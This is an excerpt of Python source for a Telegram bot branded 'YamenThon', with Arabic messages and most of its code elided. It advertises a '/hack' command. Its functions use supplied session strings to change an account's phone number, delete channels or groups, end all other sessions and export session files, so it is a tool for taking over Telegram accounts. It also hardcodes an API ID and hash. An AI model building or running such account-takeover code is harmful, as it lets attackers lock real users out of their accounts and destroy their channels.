...
from yamenthon import bot, zedub
...
# منع Telethon من طلب رقم الهاتف نهائيًا عند وجود جلسة صحيحة
def safe_session(session_string):
    if session_string and len(session_string) > 50:
        return StringSession(session_string)
    else:
        raise ValueError("❌ الجلسة غير صحيحة أو فارغة")


async def change_number_code(strses, number, code, otp):
  async with tg(safe_session(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    bot = client = X
    try: 
...
'''
mm = '''
**- عليك الانضمـام في قنـاة السـورس اولاً**  @YamenThon
'''
...
keyboard = [
  ...
  [
    Button.url("𝙔𝘼𝙈𝙀𝙉𝙏𝙃𝙊𝙉™ 𓅛", "https://t.me/YamenThon")
    ]
]
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      if len(i) > 1:
        ...
        file.write(i + "\n\n**- بواسطـة يـــمنثون @YamenThon**")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس يـــمنثون ❤️** \n/hack", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس يـــمنثون ❤️**", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك يـــمنثون.", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      await event.reply("**- لقد تم انهـاء جميـع الجلسـات .. بنجـاح \n- شكـراً لـ استخدامـك ســورس يـــمنثون**", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      try:
        ...
        await event.respond(f"**- ارسل هذا الخطأ الى @T_A_Tl \n- الخطـأ** str(e)\n")
